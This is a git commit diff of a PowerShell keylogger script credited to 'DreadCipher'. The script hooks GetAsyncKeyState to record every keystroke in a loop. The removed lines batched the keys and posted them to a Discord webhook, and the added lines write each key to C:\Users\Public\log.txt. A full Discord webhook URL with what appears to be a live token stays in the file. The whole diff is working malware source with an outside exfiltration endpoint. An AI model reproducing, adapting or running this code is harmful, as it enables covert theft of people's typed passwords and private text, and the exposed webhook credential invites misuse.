cac880b94498d0c234a05abcadd4beede773c702
Kaiondatwzck <103587362+Kaiondatwzck@users.noreply.github.com>
2025-03-31 11:21:25 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,4 +1,4 @@
-# Keylogger with Discord by DreadCipher
+# Keylogger Test by DreadCipher
 $webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
 
 Add-Type -TypeDefinition @"
@@ -10,22 +10,13 @@ public class KeyHook {
 }
 "@
 
-$buffer = ""
+"Keylogger started at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+
 while ($true) {
     Start-Sleep -Milliseconds 100
     for ($key = 8; $key -le 254; $key++) {
         if ([KeyHook]::GetAsyncKeyState($key) -eq -32767) {
-            $buffer += [char]$key
-            if ($buffer.Length -ge 10) {
-                try {
-                    $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
-                    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
-                    "Sent '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-                    $buffer = ""
-                } catch {
-                    "Error at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-                }
-            }
+            "Key pressed: $key at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
         }
     }
 }
